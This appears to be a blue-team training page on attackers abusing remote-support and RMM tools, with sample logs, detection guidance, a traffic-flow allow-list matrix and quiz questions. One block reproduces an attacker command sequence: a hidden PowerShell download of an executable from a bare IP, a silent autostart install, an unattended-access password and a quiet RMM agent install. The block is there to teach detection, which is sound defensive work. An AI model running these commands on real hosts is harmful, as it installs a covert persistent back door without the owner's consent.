---
title: "Remote Access Tools, Is Any Protocol Safe?, and the Network Summary"
tags:
  - training
  - blue-team
  - network
  - rmm
  - remote-access
  - lateral-movement
  - persistence
---

# Remote Access Tools, Is Any Protocol Safe?, and the Network Summary { #remote-tools-summary }

!!! abstract "What this page covers"
    The last idea of the protocols section: stop thinking only in protocols. **Any remote access or administration tool** — built into the OS or bought from a vendor, even one that only ever speaks HTTPS — gives whoever controls it hands-on-keyboard access, and ransomware crews use commercial remote-support and RMM (remote monitoring and management) tools as a standard step. What these tools look like on a host and on the network: a silent install command line by line, the events it leaves (4688/Sysmon 1, 7045/4697, Sysmon 3 and 22), the tool's own connection log, and the outbound-to-relay traffic pattern in `conn.log`/`ssl.log`. Then the question "is any protocol safe?" — no, anything that moves data can move evil data — and what to do instead: metadata logging, protocol enforcement, flow-based detection, outbound default-deny, and above all a **known traffic-flow matrix** that turns detection into allow-listing. Finally, a summary of the whole network part (DNS, HTTP(S), email, other protocols), mapping each attack stage to the evidence you should be able to see. Practice questions with explanations at the end.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IDs and IPs are invented for illustration (`.example`, documentation and private IPs). Product names are mentioned only because they are widely documented as abused; their own log formats vary by version.

## The 8 key points { #key-points }

1. **The protocol is not the point; the capability is.** Anything that lets one person control another computer — RDP, SSH, WinRM, VNC, *or* a commercial remote-support app over HTTPS — is a remote-control channel, and attackers need one in nearly every intrusion.
2. **Commercial remote-access and RMM tools are attacker favourites** because they are **legitimately signed**, often **ignored by antivirus**, **encrypted**, reach the internet through the vendor's **relay cloud on 443**, survive reboots as a service, and look like IT work.
3. A leaked ransomware-group playbook (2021) told affiliates to install a remote-support app on idle hosts and an **RMM agent registered to the attacker's own trial account** on others — as **persistence**. This is now a routine pattern, not a rare trick.
4. On the host, look for: **process creation** of the tool (4688 / Sysmon 1) from unusual paths or parents, a **new service** (7045 / 4697), **DNS queries and connections to the vendor's relays** (Sysmon 22 / 3), and the **tool's own connection log**.
5. **The defence is an allow-list.** Pick one approved remote tool, block or alert on every other one (application control plus DNS/proxy blocking), and protect the approved tool's console like a domain admin account.
6. **No protocol is "safe".** Any protocol that can carry data can carry commands, stolen files or a tunnel. What matters is whether this use is expected **here, between these two, at this time**.
7. **Allow-listing beats signatures.** If you know which zones may talk to which over which protocols, every out-of-place connection is suspicious — whether the attacker uses a known tool or a brand-new one.
8. Network summary: understand your architecture and flows; know what you collect and where you can see; **DNS, HTTP(S) and SMTP** carry most attack traffic; and the "other" protocols (DHCP, SMB, SSH, RDP/VNC, WinRM, FTP, ICMP, remote tools) carry most of what happens after the first foothold.

## Any remote access or administration tool { #remote-tools }

### Why a tool can matter more than a protocol { #why-tools }

Earlier pages looked at protocols one at a time: [SMB](smb.md), [SSH, RDP and VNC](ssh-rdp-vnc.md), [PowerShell remoting](psremoting-ftp-icmp.md#psremoting). Each is dangerous for the same reason: **it lets someone sitting elsewhere operate a computer.** That capability does not belong to any particular protocol. A remote-support app that tunnels a full desktop through HTTPS on port 443 gives exactly the same power as RDP on 3389 — and it is much harder to spot, because 443 is where everything else goes too.

An analogy. Your building has front doors with guards (the firewall), and the guards check the obvious doors: the RDP door, the SSH door. A remote-support tool is a **spare key cut by a reputable locksmith and handed to whoever asked for it**. It opens the door from the inside, the guards see "the locksmith's van" (a well-known vendor's servers) and wave it through, and the key works every day until someone notices it exists.

The technical reality: most commercial remote-support and RMM tools work like this.

```
[victim PC: agent/app] --outbound TLS 443--> [vendor relay cloud] <--outbound TLS 443-- [operator: console/app]
```

- The **agent** on the controlled PC makes an **outbound** connection to the vendor's relay servers and keeps it open. No inbound port needs to be opened, so the firewall and NAT never get in the way.
- The **operator** (IT staff — or the attacker) also connects outbound to the same cloud and is joined to the agent's session.
- Everything is **encrypted** end to end or at least to the relay, so a network sensor sees only "a long TLS session to a remote-support vendor."

From the attacker's side, that is close to ideal:

| Property | Why the attacker likes it |
| --- | --- |
| Signed by a real vendor | Antivirus and EDR often allow it; application control may already trust the signer |
| Outbound to the vendor's cloud on 443 | Passes firewalls and proxies; blends with normal HTTPS |
| Installs as a service, starts at boot | **Persistence** without writing any malware |
| Full GUI, file transfer, remote shell | Hands-on-keyboard control, upload tools, download data |
| Used by real IT and MSPs | "Is this ours?" is a hard question to answer quickly |
| Free trials, self-registration | The attacker can register their own account in minutes |

The categories you will meet:

- **Built into the OS:** RDP, Remote Assistance, **Quick Assist** (Windows), SSH, WinRM, VNC-style screen sharing on macOS.
- **Commercial remote support:** desktop-sharing apps that connect by an ID or code through the vendor's relay.
- **RMM platforms:** agent-based fleet management used by IT departments and MSPs (managed service providers) — scripting, software deployment, remote shell, remote desktop for thousands of machines from one web console.
- **Tunnels and developer tools:** IDE remote-tunnel features and reverse-tunnel services that expose a local shell or port through a cloud relay.
- **Remote-access hardware:** IP-KVM devices plugged into a machine's keyboard, video and mouse ports.

### What playbooks tell affiliates to do { #playbook }

In 2021 an affiliate of a large ransomware operation leaked the group's training material. Among the steps after gaining access was a short "persistence" section. Paraphrased: on hosts nobody uses, install a well-known remote-support app downloaded directly from its vendor; on other hosts, **create an account on an RMM vendor's website, download the agent installer from that account, copy it to the victim and run it, then delete the installer.**

Why that is clever:

- Nothing malicious is installed. The binaries are the vendor's own, properly signed.
- The RMM agent "phones home" to the vendor's cloud and appears in **the attacker's** console. If the defenders find and remove the attacker's malware, the attacker still has a fully working back door through a legitimate product.
- The traffic is TLS to a reputable SaaS domain.

Groups since then — and initial access brokers who sell access to them — use the same idea, and phishing campaigns increasingly deliver a **legitimate RMM installer as the "payload"** instead of malware.

### What a silent install looks like { #install }

Remote-support apps and RMM agents usually support **unattended (silent) installation**, because IT departments need it. The attacker uses the same switches. A representative sequence, as recorded in process-creation logs on `WS-SYD-0142`:

```
powershell.exe -nop -w hidden -c "iwr https://203.0.113.45/rs.exe -OutFile C:\ProgramData\rs.exe"
C:\ProgramData\rs.exe --install "C:\ProgramData\RS" --start-with-win --silent
cmd.exe /c "echo Winter2026! | C:\ProgramData\RS\rs.exe --set-password"
msiexec.exe /i C:\Users\Public\AGENT_INSTALLER.msi /qn
cmd.exe /c del C:\Users\Public\AGENT_INSTALLER.msi
```

Line by line:

- `powershell.exe -nop -w hidden -c "iwr ... -OutFile ..."` — download the remote-support executable. `-nop` = no profile, `-w hidden` = no window, `iwr` = `Invoke-WebRequest`. Downloading from a **bare IP** rather than the vendor's site is a further warning sign; some attackers do download from the vendor directly, which looks cleaner.
- `rs.exe --install "C:\ProgramData\RS" --start-with-win --silent` — install into a chosen folder, **register to start with Windows** (a service), and show nothing to the user. Switches like these are documented by vendors for mass deployment.
- `echo Winter2026! | rs.exe --set-password` — pipe a password into the app to enable **unattended access**: anyone with the app's ID and this password can connect at any time without the user clicking "accept".
- `msiexec.exe /i AGENT_INSTALLER.msi /qn` — install an RMM agent from an MSI package. `/i` = install, `/qn` = quiet, no UI. The MSI is tied to the account it was downloaded from — here, the attacker's.
- `del AGENT_INSTALLER.msi` — remove the installer to tidy up, exactly as the playbook says. The **installed agent stays.**

### The traces it leaves { #traces }

**Process creation — Security 4688 / Sysmon 1.** 4688 ("a new process has been created") is logged by Windows when process-creation auditing is on; Sysmon event 1 is the richer version with hashes, the parent process and the full command line. Attackers care because this is the event that shows *what they ran*. For remote tools, look at:

```
EventID: 1 (Sysmon Process Create)
UtcTime: 2026-11-19 02:11:37.402
Image: C:\ProgramData\RS\rs.exe
CommandLine: "C:\ProgramData\RS\rs.exe" --install "C:\ProgramData\RS" --start-with-win --silent
User: CORP\j.kim
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Hashes: SHA256=6F1C...E09A
Signature: RemoteSupport Vendor Ltd (Valid)
```

- `Image` in `C:\ProgramData\...` — legitimate IT deployments normally install under `C:\Program Files\`. A remote tool running from `ProgramData`, `Users\Public`, `Temp` or `Downloads` is suspicious.
- `CommandLine` — the silent-install and auto-start switches.
- `ParentImage: powershell.exe` — a hidden PowerShell started the installer. Your software-deployment system would be the normal parent.
- `Signature ... (Valid)` — the binary is genuinely signed. **This is why signature-based tools let it through.** Validity of the signature tells you nothing about who is using it.

**New service — System 7045 / Security 4697.** 7045 ("A service was installed in the system") is written by the Service Control Manager to the System log; 4697 is the Security-log equivalent when "Audit Security System Extension" is enabled. Attackers care because a service is the easiest way to survive reboots and run as SYSTEM.

```
Log: System   EventID: 7045   Provider: Service Control Manager
Service Name:  RS Remote Service
Service File Name: "C:\ProgramData\RS\rs.exe" --service
Service Type:  user mode service
Service Start Type: auto start
Service Account: LocalSystem
```

- `Service File Name` points into `ProgramData` — the same odd path.
- `auto start` + `LocalSystem` = runs at every boot with the highest local privileges.

**DNS and network — Sysmon 22 / Sysmon 3.** Sysmon 22 records each DNS query with the process that made it; Sysmon 3 records network connections with the process. Together they answer "which program talked to which vendor":

```
EventID: 22  Image: C:\ProgramData\RS\rs.exe  QueryName: relay-41.rs-vendor.example  QueryResults: 198.51.100.77
EventID: 3   Image: C:\ProgramData\RS\rs.exe  DestinationIp: 198.51.100.77  DestinationPort: 443  Protocol: tcp  Initiated: true
```

**The tool's own logs.** Most remote-support apps keep a connection log in their program-data or user-profile folder. Formats vary by product and version, but they typically record each session's **time**, **direction** (incoming/outgoing), the **remote peer's ID** and **how it authenticated** (password, token, user accepted). A simplified example:

```
Incoming  2026-11-19 02:14  Passwd  RS-ID 718 334 902   user: j.kim
Incoming  2026-11-19 03:40  Passwd  RS-ID 718 334 902   user: j.kim
Incoming  2026-11-20 01:02  Token   RS-ID 718 334 902   user: j.kim
```

- `Incoming` — someone connected **to** this PC.
- `Passwd` / `Token` — authenticated with the unattended password, later with a saved token: nobody clicked "accept".
- The same remote ID at 02:00–03:00 on consecutive nights — the attacker's ID, and an **indicator you can hunt for on other hosts' logs.**

RMM platforms also keep **server-side audit logs** in the vendor console: which technician account ran which script on which device. If the attacker used your *legitimate* RMM, that console log is the best evidence there is — and the console account is what they stole.

**On the network — `conn.log` and `ssl.log`.**

```
conn.log: ts=2026-11-19T02:11:52Z id.orig_h=10.20.30.41 id.resp_h=198.51.100.77 id.resp_p=443 proto=tcp service=ssl duration=10813.4 orig_bytes=96402117 resp_bytes=1840221 conn_state=SF
ssl.log:  ts=2026-11-19T02:11:52Z id.orig_h=10.20.30.41 id.resp_h=198.51.100.77 server_name=relay-41.rs-vendor.example version=TLSv13 established=T
```

- `duration=10813.4` — a single TLS session lasting about **three hours**. Normal browsing makes many short connections; a remote-control session is one long one.
- `orig_bytes=96402117` (about 92 MB **out** from the PC) vs `resp_bytes=1840221` (about 1.8 MB **in**) — the PC sends a steady stream (screen updates) and receives only small inputs (keystrokes, mouse moves). That is the shape of someone **watching and controlling this desktop**. A large burst out can also mean files being pulled off the machine, so check the tool log for file transfers.
- `server_name=relay-41.rs-vendor.example` — the SNI names the vendor's relay. This is the cheapest detection there is: a list of remote-tool vendor domains and an alert when an unapproved one appears.

### Built-in tools and the "help desk" trick { #help-desk }

Not every attacker installs anything. **Windows Quick Assist** is built in and signed by Microsoft. From 2024, ransomware operators were documented **flooding a user's mailbox with spam ("email bombing"), then calling or messaging them over a collaboration app as "IT support" offering to fix it**, and asking the user to open Quick Assist and share the code. The user grants control; the attacker installs their tools.

There is no exploit and no malware at that stage, only a legitimate tool and a convinced user. Evidence: the Quick Assist process (`QuickAssist.exe`) starting on a machine where IT does not use it, at the time of an inbound external call, followed by downloads and new processes. Many organisations now remove or block Quick Assist and tell users that IT will never cold-call them to request a remote session.

### Defending against remote tools { #remote-tools-defence }

1. **Choose one approved remote tool** (or a short list) and write it down: which product, which tenant/account, which admins.
2. **Block the rest.** Application control (for example WDAC or AppLocker rules by signer/product) on endpoints, and DNS/proxy blocking of other vendors' relay domains. Community-maintained lists of remote tools, their binaries and domains exist and save a lot of work.
3. **Alert on any unapproved tool**, on installs outside software deployment, and on the approved tool connecting to a **tenant/account that is not yours** (many RMM products expose the account ID in their config or traffic).
4. **Protect the approved tool's console like Tier 0.** It can run code as SYSTEM on every managed machine. Enforce phishing-resistant MFA, restrict console logins, and send its audit log to the SIEM.
5. **Patch internet-facing remote-access products quickly.** Remote-support servers and RMM products have had critical vulnerabilities that were exploited within days.
6. **Hunt regularly:** services and installed software matching remote-tool names or signers; long-lived 443 sessions from workstations to remote-tool vendors; the same remote ID across several hosts.

## Is any protocol safe? { #any-safe }

Short answer: **no.** A protocol is just an agreed way to move data. If it can move data, it can move a stolen database, a command, or someone else's traffic inside it. The previous pages showed this over and over:

| Protocol | Looks harmless because... | ...but it carried |
| --- | --- | --- |
| DNS | "just name lookups" | [Tunnels and C2](../dns/dns-abuse.md) |
| ICMP | "just ping" | [Payloads and tunnels](psremoting-ftp-icmp.md#icmp) |
| HTTPS | "just web browsing" | C2, exfiltration, remote-support sessions |
| SSH | "admin tool" | [Inbound RDP through an outbound tunnel](ssh-rdp-vnc.md) |
| SMB | "file sharing" | [Remote service creation and execution](smb.md) |
| DHCP | "just addressing" | [Rogue DHCP servers and DNS takeover](dhcp.md) |

A protocol that cannot deliver data is useless, so the answer cannot be "find the safe protocol". It has to be **"recognise unusual use of every protocol."** That needs several layers.

### The layers that work together { #layers }

- **Deep packet inspection that logs metadata for every transaction.** Tools like Zeek don't keep the full traffic; they write a line per DNS query, HTTP request, TLS handshake, SMB file access, SSH session. This metadata is what makes the earlier pages' detections possible ([Zeek conn.log](../../../network/zeek/conn-log.md)).
- **Protocol compliance on the firewall.** Modern firewalls identify the application, not just the port: "443 must be TLS", "53 must be DNS". An SSH handshake on 443 ([as in this example](ssh-rdp-vnc.md)) or non-DNS data on 53 is then blocked or flagged.
- **Network security monitoring (NSM).** Someone (and some analytics) actually looking at the alerts, metadata and packets — the work this whole part has described.
- **Layer 3/4 detection on top.** Even when content is encrypted, IPs, ports, sizes, timing and duration still show beaconing, tunnelling and bulk transfers ([beaconing and C2](../../../network/beaconing-c2.md)).
- **Outbound default deny.** Servers and workstations should not be able to reach *any* internet host on *any* port. Allow what is needed (often only via the proxy) and deny the rest. This alone kills many tunnels and exfiltration paths.
- **Well-defined subnets and traffic flows.** The most powerful layer, explained next.

### Known flows turn detection into allow-listing { #flow-matrix }

If you can write down which zones should talk to which, over what, then **everything else is an anomaly** — no signature needed. A small example traffic-flow matrix:

| From | To | Allowed | Notes |
| --- | --- | --- | --- |
| User VLAN `10.20.30.0/24` | Internet | HTTP/HTTPS **via proxy only** | No direct 443, no SSH, no FTP |
| User VLAN | Server VLAN `10.20.10.0/24` | HTTPS to app servers, SMB to file servers | Not WinRM, not RDP |
| User VLAN | User VLAN | **Nothing** | Workstations never talk to each other |
| Admin jump hosts `10.20.5.0/28` | Server VLAN | RDP, WinRM, SSH | The only source for admin protocols |
| Server VLAN | Internet | Patch/update endpoints only | Servers don't browse |
| DHCP/DNS servers | Anywhere internal | DHCP, DNS | Only these answer DHCP and DNS |

Now read these `conn.log` lines against it:

```
id.orig_h=10.20.30.41  id.resp_h=10.20.30.77  id.resp_p=445   service=smb
id.orig_h=10.20.30.41  id.resp_h=10.20.10.15  id.resp_p=5985  service=http
id.orig_h=10.20.10.15  id.resp_h=203.0.113.90 id.resp_p=22    service=ssh
id.orig_h=10.20.30.52  id.resp_h=198.51.100.77 id.resp_p=443  service=ssl
```

- Line 1: workstation → workstation on **445**. The matrix says user-to-user is *nothing*. That is the classic lateral-movement signal ([SMB](smb.md)).
- Line 2: workstation → server on **5985** (WinRM). Admin protocols are only allowed from jump hosts. Someone is remoting from a user laptop ([PowerShell remoting](psremoting-ftp-icmp.md#psremoting)).
- Line 3: server → internet on **22**. Servers only reach update endpoints. Outbound SSH from a server is exfiltration or an inbound tunnel ([SSH](ssh-rdp-vnc.md)).
- Line 4: workstation → internet on **443 directly**, not via the proxy. The matrix says proxy only — so this either bypasses policy, or the firewall allows it and should not. The destination is a remote-support relay ([above](#traces)).

None of these needed a malware signature. Each is just **"not on the list."** That is why allow-listing is one of the strongest detection strategies: it catches known and **unknown** techniques alike, because it is built from what is normal for *you*, not from what attackers did elsewhere. The price is that you must know your network, keep the matrix up to date, and tune exceptions — which is why network architecture knowledge is the first thing a SOC needs.

## Summary of the network part { #network-summary }

The pages of this part, taken together, come down to a few ideas.

**1. Understand the pieces of your network and how traffic flows.** What are the segments? What controls separate them? Where does internet traffic leave? A SOC that cannot answer these cannot tell normal from abnormal, and cannot build the flow matrix above.

**2. Know what you collect and where you can see.** Full packet capture, flow records, protocol metadata (Zeek-style logs), proxy, DNS and mail logs, firewall logs, endpoint telemetry — each covers different stages, and each sensor only sees what passes it. Walk an attack through your network and ask at each step: *would we have evidence?*

| Attack stage | Example | Evidence you should have | Where it was covered |
| --- | --- | --- | --- |
| Delivery | Phishing email with a link | Mail headers, `Authentication-Results:`, mail platform logs | [Email](../email/index.md) |
| Execution / first C2 | User clicks; host resolves and contacts C2 | DNS logs, proxy/HTTP logs, TLS SNI/JA4 | [DNS](../dns/index.md), [HTTP](../http/index.md), [HTTP(S) analysis](../http-analysis/index.md) |
| Discovery / lateral movement | Laptop → server over SMB, WinRM, RDP | `conn.log`, `smb_*`, 4624/4672/7045, Sysmon | [SMB](smb.md), [SSH/RDP](ssh-rdp-vnc.md), [WinRM](psremoting-ftp-icmp.md) |
| Persistence | Remote-support app or RMM agent installed | 4688/Sysmon 1, 7045/4697, vendor SNI | This page |
| Staging | Data copied to a server in the DMZ | SMB file logs, large internal transfers | [SMB](smb.md) |
| Exfiltration | Out over HTTPS, FTP, SSH, DNS or ICMP | Flow volume, `ftp.log`, `ssh.log`, DNS/ICMP anomalies | [FTP/ICMP](psremoting-ftp-icmp.md), [DNS abuse](../dns/dns-abuse.md) |
| Attribution of IPs | Which device had that IP? | DHCP leases, 4624/4768 | [DHCP](dhcp.md) |

If any row is empty for your organisation, that is a gap to raise.

**3. DNS, HTTP(S) and SMTP are of primary importance.** Almost every intrusion uses at least one of them. DNS and HTTP(S) let you **find and follow** attack traffic — the lookup, the download, the beacon. SMTP is complicated, phishing is a primary initial-access vector, and understanding authentication technology and headers is how you identify spoofing.

**4. The other common protocols are all used for evil too.** DHCP is your IP-to-device record and a target for rogue servers; SMB, SSH, RDP/VNC, WinRM and remote tools are how attackers move and stay; FTP, ICMP (and DNS, and HTTPS) are how data leaves. Know what each looks like when normal, so the abnormal stands out.

The next part moves from the network to **the endpoints themselves** — hosts, logs and files.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    Everything on this page holds, and the remote-tool point has become *more* important. Abuse of legitimate remote-access and RMM software is one of the most consistently reported intrusion techniques in 2024–2026 incident-response reports, for both initial access and persistence. MITRE ATT&CK covers it as **T1219 Remote Access Tools**. "If it can move data, it can be abused", outbound default-deny, protocol-aware firewalls and allow-listing of known flows remain the core defensive ideas, and the network part's emphasis on DNS, HTTP(S) and email still matches where attacks start.

!!! info "[Changed] What has changed"
    - **ATT&CK reorganised the technique.** T1219, formerly "Remote Access Software", is now **"Remote Access Tools"** with sub-techniques for **IDE tunnelling** (T1219.001), **remote desktop software** (T1219.002) and **remote-access hardware** such as IP-KVMs (T1219.003).
    - **Government guidance.** A joint US advisory in January 2023 (CISA and partners) described criminals sending phishing that led victims to install legitimate remote-support software, and recommended application control and auditing of RMM tools. Similar warnings have been repeated since.
    - **"Help desk" social engineering with built-in tools.** Since 2024, email bombing followed by fake IT calls through collaboration apps and **Quick Assist** sessions has been documented as a route to ransomware. The tool is Microsoft-signed and needs no install.
    - **The tools themselves became targets.** Critical flaws in remote-support/RMM server products were exploited at scale (for example in a widely used remote-support server product in early 2024, and in another remote-support product used against MSPs in 2025), and one major remote-support vendor disclosed a breach of its production systems in 2024 and rotated its code-signing certificate. Your approved tool is part of your attack surface.
    - **Phishing delivers RMM instead of malware.** Many 2025–2026 campaigns install a genuine, signed RMM agent tied to the attacker's account as the first-stage "payload", sidestepping malware detection completely.
    - **Community resources** now track remote tools, their binaries, paths and network domains specifically for defenders, which makes the allow/deny approach practical.
    - **Identity and cloud shifted the flow matrix.** With SaaS, VPN replacement (ZTNA) and remote work, "zones" now include identities, devices and cloud tenants, not just subnets. The allow-list idea is the same, but it is enforced in identity and access policies as much as in firewalls.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't trust a valid code signature** as evidence that a remote tool is benign. Signed by the vendor is exactly what attackers want.
    - **Don't only watch "remote-admin ports"** (3389, 22, 5985, 5900). Today's remote control mostly runs over 443 to vendor clouds.
    - **Don't tolerate "every team picks its own remote tool."** Without a single approved tool, you cannot tell IT from intruders.
    - **Don't treat the RMM console as an ordinary SaaS login.** It is code execution as SYSTEM on every managed machine; protect it with phishing-resistant MFA and monitor its audit log.
    - **Don't block-list your way to safety.** New remote tools appear constantly; enforce an allow-list and alert on everything else.
    - **Don't assume encrypted means invisible.** SNI, JA4, duration, volume and the process making the connection still identify most remote-tool sessions.

## Practice questions { #quiz }

### Question 1

On `WS-SYD-0142` (user `CORP\j.kim`) you find: Sysmon 1 for `C:\ProgramData\RS\rs.exe --install ... --start-with-win --silent` with parent `powershell.exe`, a System **7045** for `RS Remote Service` running as `LocalSystem` with `auto start`, and the next night a 3-hour TLS session to `relay-41.rs-vendor.example`. The binary is validly signed. Your organisation's only approved remote tool is a different product. Explain each piece of evidence and what you would do next.

??? success "Answer and explanation"
    - **Sysmon 1** (process create): the remote-support app was installed silently into `ProgramData`, set to start with Windows, launched by a hidden PowerShell — not by your software-deployment system. That is attacker-style installation.
    - **7045** (new service, System log): the install created an auto-start service as `LocalSystem` — **persistence** that survives reboots with full privileges.
    - **Long TLS session to the vendor relay**: a remote-control session through the vendor's cloud — someone operating the machine for three hours at night.
    - **Valid signature**: explains why AV did not stop it; says nothing about who is using it.

    Since it is not the approved tool, treat it as a **compromise with an attacker back door**. Next: isolate the host; collect the tool's own connection log to get the **remote ID** and session times; hunt for the same ID, binary hash, service name and relay SNI on **all** hosts; find the PowerShell that ran the download (4104, Sysmon 1 parent chain) and how the attacker got in; check what was done during the sessions (files, new processes, accounts). Then block the vendor's domains and the binary by application control, and remove the service. Don't just uninstall it — the attacker may have other footholds.

### Question 2

A colleague proposes: "Let's make a list of safe protocols to allow and block everything else at the firewall. DNS, HTTPS and ICMP are safe, so we'll allow those out from every host." What is right and wrong about this, and what would you propose instead?

??? success "Answer and explanation"
    **Right:** blocking by default and allowing only what is needed (**outbound default deny**) is a strong control.

    **Wrong:** there are no "safe" protocols. **DNS** can carry tunnels and C2; **HTTPS** carries C2, exfiltration and remote-support sessions; **ICMP** echo can carry any payload. Allowing them *from every host to anywhere* leaves the three most popular covert channels wide open.

    **Instead:** allow by **who, to where, how**: workstations use the internal DNS resolvers only (no direct 53 out); web goes through the proxy (no direct 443); ICMP echo out only where needed (keeping essential ICMP types like "fragmentation needed"); servers reach only update endpoints. Write it down as a traffic-flow matrix, enforce it with a protocol-aware firewall, log metadata for what is allowed (DNS, proxy, TLS), and alert on anything that doesn't match. Then even an allowed protocol used in an unusual way (huge DNS TXT volume, a 3-hour TLS session to a remote-tool vendor) stands out.

### Question 3

Using the traffic-flow matrix on this page, which of these connections should alert, and what would each most likely mean?

```
a) 10.20.5.3   -> 10.20.10.15  tcp/3389  rdp
b) 10.20.30.41 -> 10.20.30.88  tcp/135   dce_rpc
c) 10.20.10.22 -> 203.0.113.18 tcp/21    ftp
d) 10.20.30.60 -> 10.20.2.10   udp/53    dns
e) 10.20.30.61 -> 10.20.30.1   udp/67    dhcp   (10.20.30.61 answering DHCPOFFERs)
```

??? success "Answer and explanation"
    - **a) No alert.** `10.20.5.3` is in the admin jump-host range `10.20.5.0/28`, and RDP to servers is allowed from there. (Still log it, and check the account used.)
    - **b) Alert.** Workstation → workstation is "nothing", and 135 is RPC — used for remote service control, WMI and scheduled tasks. Likely lateral movement or remote execution between user PCs.
    - **c) Alert.** A server reaching the internet on **FTP** — servers only reach update endpoints. Likely exfiltration (check `ftp.log` for `STOR` and sizes).
    - **d) No alert, assuming `10.20.2.10` is the internal DNS server.** Clients querying the internal resolver is the expected flow. (If it is *not* a DNS server, alert.)
    - **e) Alert.** Only the approved DHCP servers should answer DHCP. A workstation sending **DHCPOFFERs** is a **rogue DHCP server** — it could hand out itself as gateway or DNS and intercept traffic ([DHCP](dhcp.md)).

    The point: none of these needed a signature. Each decision came from comparing the flow with what is known to be normal.

## Related { #related }

- [Remote Desktop Protocol attacks](../../../adversary/rdp.md) · [PsExec and SMB lateral movement](../../../adversary/psexec-smb.md) · [WMI and WinRM](../../../adversary/wmi-winrm.md)
- [Persistence techniques](../../../adversary/persistence.md) · [Living off the land binaries](../../../adversary/lolbins.md) · [Phishing delivery](../../../adversary/phishing-delivery.md)
- [Beaconing and C2 on the network](../../../network/beaconing-c2.md) · [Zeek conn.log](../../../network/zeek/conn-log.md) · [Zeek ssl/x509](../../../network/zeek/ssl-x509.md)
- [Windows event IDs](../../../basics/windows-event-ids.md) · [Well-known ports](../../../basics/well-known-ports.md)
- [DHCP](dhcp.md) · [SMB](smb.md) · [SSH, RDP and VNC](ssh-rdp-vnc.md) · [PowerShell remoting, FTP and ICMP](psremoting-ftp-icmp.md)
